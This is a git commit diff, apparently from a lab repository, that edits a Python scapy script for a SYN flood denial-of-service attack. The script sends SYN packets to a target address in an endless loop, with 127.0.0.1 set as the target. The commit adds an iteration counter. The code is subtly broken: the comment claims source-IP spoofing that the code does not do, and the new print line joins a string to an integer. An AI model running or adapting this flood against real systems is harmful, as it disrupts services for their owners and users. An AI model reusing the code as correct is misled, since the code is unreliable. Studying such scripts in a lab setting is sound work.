7cf4b5bb73f1330b58af129606c3b72e0057b943
subhrendu1987 <subhrendu@idrbt.ac.in>
2024-05-07 04:10:51 +0530

    modified:   SYN_flooding/flood.py

--- SYN_flooding/flood.py
+++ SYN_flooding/flood.py
@@ -3,10 +3,12 @@ from scapy.all import *
 def syn_flood(target_ip, target_port):
     # Craft a SYN packet with a spoofed source IP address
     syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S", seq=12345)
-
+    i=0
     # Send the SYN packet in a loop
     while True:
         send(syn_packet, verbose=0)
+        print("Iteration: "+i)
+        i=i+1
 
 if __name__ == "__main__":
     target_ip = "127.0.0.1"
